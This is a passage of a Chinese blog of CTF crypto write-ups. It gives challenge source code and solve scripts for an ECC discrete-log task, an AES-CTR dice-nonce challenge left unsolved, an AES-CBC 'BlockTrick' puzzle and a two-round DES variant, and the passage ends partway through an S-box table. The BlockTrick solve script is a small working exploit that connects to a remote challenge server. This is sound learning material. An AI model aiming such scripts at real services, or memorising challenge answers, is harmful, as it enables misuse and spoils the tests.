<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p = <span class="number">17459102747413984477</span></span><br><span class="line">a = <span class="number">2</span></span><br><span class="line">b = <span class="number">3</span></span><br><span class="line">G = (<span class="number">15579091807671783999</span>, <span class="number">4313814846862507155</span>)</span><br><span class="line">Q = (<span class="number">8859996588597792495</span>, <span class="number">2628834476186361781</span>)</span><br><span class="line">E = EllipticCurve(GF(p),[a,b])</span><br><span class="line">G = E.point(G)</span><br><span class="line">Q = E.point(Q)</span><br><span class="line">dl = discrete_log(Q, G, G.order(), operation=<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(dl))</span><br></pre></td></tr></table></figure>

<p>出来</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">m1n1_3cc</span><br></pre></td></tr></table></figure>

<p>感觉 ECC 也没有特别复杂，可以在后续研究一下，毕竟没有 RSA 那么多</p>
<h2 id="yahtzee（unsolved）"><a href="#yahtzee（unsolved）" class="headerlink" title="yahtzee（unsolved）"></a><strong>yahtzee</strong>（unsolved）</h2><blockquote>
<p>题目描述</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc mc.ax 31076</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Pseudo-random number generators are weak! I use only true RNGs, like rolling a set of dice!</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = f.read().strip()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;keyfile&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    key = f.read()</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(key)==<span class="number">32</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Pseudorandom number generators are weak!</span></span><br><span class="line"><span class="string">True randomness comes from phyisical objects, like dice!</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TrueRNG</span>:</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">die</span>():</span></span><br><span class="line">        <span class="keyword">return</span> randint(<span class="number">1</span>, <span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">yahtzee</span>(<span class="params">N</span>):</span></span><br><span class="line">        dice = [TrueRNG.die() <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(N)]</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">sum</span>(dice)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, num_dice</span>):</span></span><br><span class="line">        self.rolls = num_dice</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> TrueRNG.yahtzee(self.rolls)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">message, key, true_rng</span>):</span></span><br><span class="line">    nonce = true_rng.<span class="built_in">next</span>()</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CTR, nonce = long_to_bytes(nonce))</span><br><span class="line">    <span class="keyword">return</span> cipher.encrypt(message)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Stick the flag in a random quote!</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_message</span>():</span></span><br><span class="line">    NUM_QUOTES = <span class="number">25</span></span><br><span class="line">    quote_idx = randint(<span class="number">0</span>,NUM_QUOTES-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;quotes.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> idx, line <span class="keyword">in</span> <span class="built_in">enumerate</span>(f):</span><br><span class="line">            <span class="keyword">if</span> idx == quote_idx:</span><br><span class="line">                quote = line.strip().split()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    quote.insert(randint(<span class="number">0</span>, <span class="built_in">len</span>(quote)), flag)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27; &#x27;</span>.join(quote)</span><br><span class="line"></span><br><span class="line">banner = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">============================================================================</span></span><br><span class="line"><span class="string">=            Welcome to the yahtzee message encryption service.            =</span></span><br><span class="line"><span class="string">=  We use top-of-the-line TRUE random number generators... dice in a cup!  =</span></span><br><span class="line"><span class="string">============================================================================</span></span><br><span class="line"><span class="string">Would you like some samples?</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">prompt = <span class="string">&quot;Would you like some more samples, or are you ready to &#x27;quit&#x27;?\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    NUM_DICE = <span class="number">2</span></span><br><span class="line">    true_rng = TrueRNG(NUM_DICE)</span><br><span class="line">    inp      = <span class="built_in">input</span>(banner)</span><br><span class="line">    <span class="keyword">while</span> <span class="string">&#x27;quit&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> inp.lower():</span><br><span class="line">        message = random_message().encode()</span><br><span class="line">        encrypted = encrypt(message, key, true_rng)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Ciphertext:&#x27;</span>, hexlify(encrypted).decode())</span><br><span class="line">        inp = <span class="built_in">input</span>(prompt)</span><br></pre></td></tr></table></figure>

<p>看不懂</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>20210731 DAS 极客巅峰 UIUCTF2021 cryptoctfCrypto方向部分WP</title>
    <url>/posts/fadeeed/</url>
    <content><![CDATA[<p>前两周去北方支教，回来了又去了红帽杯，哈哈跑了半个中国，收获还挺大的。但红帽杯零贡献，再次让我知道了学pwn的必要。回归开始集训，可以安分点了</p>
<p>七月的尾巴赛题，没有当场做出来的看师傅博客复现了</p>
<p>长文废话警告</p>
<span id="more"></span>

<h2 id="2021DASCTF实战精英夏令营暨DASCTF-July-X-CBCTF-4th"><a href="#2021DASCTF实战精英夏令营暨DASCTF-July-X-CBCTF-4th" class="headerlink" title="2021DASCTF实战精英夏令营暨DASCTF July X CBCTF 4th"></a>2021DASCTF实战精英夏令营暨DASCTF July X CBCTF 4th</h2><h3 id="Crypto-Yusa的密码学签到——BlockTrick"><a href="#Crypto-Yusa的密码学签到——BlockTrick" class="headerlink" title="Crypto-Yusa的密码学签到——BlockTrick"></a>Crypto-Yusa的密码学签到——BlockTrick</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">a</span>):</span></span><br><span class="line">	size = (<span class="number">16</span>-<span class="built_in">len</span>(a)%<span class="number">16</span>)%<span class="number">16</span></span><br><span class="line">	a += <span class="built_in">chr</span>(size)*size</span><br><span class="line">	<span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line">iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">key = os.urandom(<span class="number">16</span>)</span><br><span class="line">enc = AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line"><span class="built_in">print</span>(iv.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		trick = raw_input(<span class="string">&quot;&quot;</span>)</span><br><span class="line">		trick = pad(trick.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">		cipher = enc.encrypt(trick)</span><br><span class="line">		<span class="keyword">if</span> trick == cipher <span class="keyword">and</span> trick != <span class="string">&quot;&quot;</span>:</span><br><span class="line">			<span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">				<span class="built_in">print</span>(f.read())</span><br><span class="line">				exit()</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span>(cipher.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;Try again&quot;</span>)</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		exit()</span><br></pre></td></tr></table></figure>

<p>尚师傅给的思路，两轮AES_CBC，用已知IV去异或，具体的过程还是对着CBC的流程看去吧，小难想，但想透了就酱</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25321</span>)</span><br><span class="line">iv = sh.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment"># first time</span></span><br><span class="line">sh.send(iv)</span><br><span class="line">cipher = sh.recvline()</span><br><span class="line">sh.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment"># second time</span></span><br><span class="line">sh.send(cipher)</span><br><span class="line">sh.recv()</span><br></pre></td></tr></table></figure>

<h3 id="Crypto-Yusa的密码学课堂——SEDSED（recuring）"><a href="#Crypto-Yusa的密码学课堂——SEDSED（recuring）" class="headerlink" title="Crypto-Yusa的密码学课堂——SEDSED（recuring）"></a>Crypto-Yusa的密码学课堂——SEDSED（recuring）</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> My_box <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_key</span>(<span class="params">key</span>):</span></span><br><span class="line">    key_64 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        key_64 += <span class="string">&#x27;&#123;0:04b&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>(key[i], <span class="number">16</span>))</span><br><span class="line">    key_56 = gen_56bit(key_64)</span><br><span class="line">    left_key, right_key = key_56[:<span class="number">28</span>], key_56[<span class="number">28</span>:]</span><br><span class="line">    round_keys = <span class="built_in">list</span>()</span><br><span class="line">    <span class="keyword">for</span> index <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        L = circular_shift(left_key, round_shifts[index])</span><br><span class="line">        R = circular_shift(right_key, round_shifts[index])</span><br><span class="line">        round_key = gen_48bit(L + R)</span><br><span class="line">        round_keys.append(round_key)</span><br><span class="line">        left_key = L</span><br><span class="line">        right_key = R</span><br><span class="line">    <span class="keyword">return</span> round_keys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">circular_shift</span>(<span class="params">key, n</span>):</span></span><br><span class="line">    temp = <span class="string">&quot;&quot;</span></span><br><span class="line">    temp = key[n:] + key[:n]</span><br><span class="line">    <span class="keyword">return</span> temp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_56bit</span>(<span class="params">key</span>):</span></span><br><span class="line">    key_56 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> KEY_P1:</span><br><span class="line">        key_56 += key[x - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> key_56</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_48bit</span>(<span class="params">key</span>):</span></span><br><span class="line">    key_48 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> KEY_P2:</span><br><span class="line">        key_48 += key[x - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> key_48</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">plain_text, sub_keys</span>):</span></span><br><span class="line">    plain_textb = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        plain_textb += <span class="string">&#x27;&#123;0:04b&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>(plain_text[i], <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">    plain_textp = permutation(plain_textb)</span><br><span class="line">    left, right = plain_textp[:<span class="number">32</span>], plain_textp[<span class="number">32</span>:]</span><br><span class="line">    out = func(right, sub_keys[<span class="number">0</span>])</span><br><span class="line">    temp = <span class="built_in">int</span>(out, <span class="number">2</span>) ^ <span class="built_in">int</span>(left, <span class="number">2</span>)</span><br><span class="line">    left, right = right, <span class="string">&#x27;&#123;0:032b&#125;&#x27;</span>.<span class="built_in">format</span>(temp)</span><br><span class="line">    out = func(right, sub_keys[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    temp = <span class="built_in">int</span>(out, <span class="number">2</span>) ^ <span class="built_in">int</span>(left, <span class="number">2</span>)</span><br><span class="line">    left = <span class="string">&#x27;&#123;0:032b&#125;&#x27;</span>.<span class="built_in">format</span>(temp)</span><br><span class="line">    final = inv_permutation(left + right)</span><br><span class="line">    cipher = <span class="built_in">hex</span>(<span class="built_in">int</span>(final, <span class="number">2</span>))[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">permutation</span>(<span class="params">plain_text</span>):</span></span><br><span class="line">    p = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> IP:</span><br><span class="line">        p += plain_text[x - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">text, key</span>):</span></span><br><span class="line">    exp = expand(text)</span><br><span class="line">    s_input = <span class="string">&#x27;&#123;0:048b&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>(exp, <span class="number">2</span>) ^ <span class="built_in">int</span>(key, <span class="number">2</span>))</span><br><span class="line">    s_out = sbox(s_input)</span><br><span class="line">    f_final = per_func(s_out)</span><br><span class="line">    <span class="keyword">return</span> f_final</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">expand</span>(<span class="params">text</span>):</span></span><br><span class="line">    temp = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> E:</span><br><span class="line">        temp += text[x - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> temp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inv_permutation</span>(<span class="params">text</span>):</span></span><br><span class="line">    final = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> Inv_IP:</span><br><span class="line">        final += text[x - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> final</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">per_func</span>(<span class="params">s_output</span>):</span></span><br><span class="line">    s_final = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> P:</span><br><span class="line">        s_final += s_output[x - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> s_final</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sbox</span>(<span class="params">s_input, index=<span class="literal">None</span></span>):</span></span><br><span class="line">    s_out = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> index != <span class="literal">None</span>:</span><br><span class="line">        i = index</span><br><span class="line">        row = <span class="built_in">int</span>(s_input[<span class="number">0</span>] + s_input[<span class="number">5</span>], <span class="number">2</span>)</span><br><span class="line">        column = <span class="built_in">int</span>(s_input[<span class="number">1</span>:<span class="number">5</span>], <span class="number">2</span>)</span><br><span class="line">        s_out += <span class="string">&#x27;&#123;0:04b&#125;&#x27;</span>.<span class="built_in">format</span>(S[i][row][column])</span><br><span class="line">        <span class="keyword">return</span> s_out</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            row = <span class="built_in">int</span>(s_input[<span class="number">6</span> * i] + s_input[<span class="number">6</span> * i + <span class="number">5</span>], <span class="number">2</span>)</span><br><span class="line">            column = <span class="built_in">int</span>(s_input[<span class="number">6</span> * i + <span class="number">1</span>:<span class="number">6</span> * i + <span class="number">5</span>], <span class="number">2</span>)</span><br><span class="line">            s_out += <span class="string">&#x27;&#123;0:04b&#125;&#x27;</span>.<span class="built_in">format</span>(S[i][row][column])</span><br><span class="line">        <span class="keyword">return</span> s_out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span>(<span class="params">plain_text</span>):</span></span><br><span class="line">    sub_keys = gen_key(key_64)</span><br><span class="line">    cipher_text = encrypt(plain_text, sub_keys)</span><br><span class="line">    <span class="keyword">return</span> cipher_text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">plain_text</span>):</span></span><br><span class="line">    size = (<span class="number">16</span> - (<span class="built_in">len</span>(plain_text) % <span class="number">16</span>)) % <span class="number">16</span></span><br><span class="line">    plain_text += size * <span class="string">&#x27;0&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> plain_text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myenc</span>(<span class="params">plain_text</span>):</span></span><br><span class="line">    plain_text = pad(plain_text)</span><br><span class="line">    cipher_text = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(plain_text), <span class="number">16</span>):</span><br><span class="line">        block = plain_text[i:i + <span class="number">16</span>]</span><br><span class="line">        block_enc = enc(block).rjust(<span class="number">16</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        cipher_text += block_enc</span><br><span class="line">    <span class="keyword">return</span> cipher_text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc2</span>(<span class="params">plain_text, key</span>):</span></span><br><span class="line">    sub_keys = gen_key(key)</span><br><span class="line">    cipher_text = encrypt(plain_text, sub_keys)</span><br><span class="line">    <span class="keyword">return</span> cipher_text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key_64 = os.urandom(<span class="number">8</span>).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">teststring = <span class="string">&quot;testtest&quot;</span></span><br><span class="line"><span class="built_in">print</span>(enc2(teststring.encode().<span class="built_in">hex</span>(), key_64))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = f.read()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag: &quot;</span>, myenc(flag.encode().<span class="built_in">hex</span>()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 77a35598c47aeea6</span></span><br><span class="line"><span class="comment"># flag:  86721c7c1ebe2d0af8aa8e073073931b4a5ae6dcf03c784e3c70b5f8ce71cf9eb87f9b836eea0118</span></span><br></pre></td></tr></table></figure>

<p>My_box</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 64-&gt;56</span></span><br><span class="line">KEY_P1 = [<span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>,</span><br><span class="line">          <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>]</span><br><span class="line">round_shifts = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>]</span><br><span class="line"><span class="comment"># 56-&gt;48</span></span><br><span class="line">KEY_P2 = [<span class="number">14</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">28</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">21</span>, <span class="number">10</span>, <span class="number">23</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">26</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">7</span>, <span class="number">27</span>, <span class="number">20</span>, <span class="number">13</span>, <span class="number">2</span>, <span class="number">41</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">47</span>,</span><br><span class="line">          <span class="number">55</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">51</span>, <span class="number">45</span>, <span class="number">33</span>, <span class="number">48</span>, <span class="number">44</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">56</span>, <span class="number">34</span>, <span class="number">53</span>, <span class="number">46</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">36</span>, <span class="number">29</span>, <span class="number">32</span>]</span><br><span class="line"></span><br><span class="line">IP = [<span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">64</span>, <span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>,</span><br><span class="line">      <span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>, <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>,</span><br><span class="line">      <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">7</span>]</span><br><span class="line">E = [<span class="number">32</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">20</span>, <span class="number">21</span>,</span><br><span class="line">     <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">S = [</span><br><span class="line">    <span class="comment"># Box-1</span></span><br><span class="line">    [</span><br><span class="line">        [<span class="number">14</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">7</span>],</span><br><span class="line">        [<span class="number">0</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">8</span>],</span><br><span class="line">        [<span class="number">4</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">0</span>],</span><br><span class="line">        [<span class="number">15</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">13</span>]</span><br><span class="line">    ],</span><br><span class="line">    <span class="comment"># Box-2</span></span><br><span class="line"></span><br><span class="line">    [</span><br><span class="line">        [<span class="number">15</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">10</span>],</span><br><span class="line">        [<span class="number">3</span>, <span class="number">13</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">5</span>],</span><br><span class="line">        [<span class="number">0</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">5</span>, <span 